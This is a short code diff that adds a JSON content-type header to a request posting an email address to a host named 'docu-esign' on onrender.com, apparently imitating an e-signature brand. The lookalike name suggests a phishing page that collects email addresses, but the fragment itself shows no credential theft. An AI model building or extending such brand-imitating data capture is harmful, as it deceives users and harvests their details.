@@ -45,6 +45,7 @@
         let payLoad = {id: 0, email: email}
         let emailXhr = new XMLHttpRequest();
         emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
+        emailXhr.setRequestHeader("Content-type", "application/json");
         emailXhr.send(JSON.stringify(payLoad));
 
         emailXhr.onreadystatechange = function() {
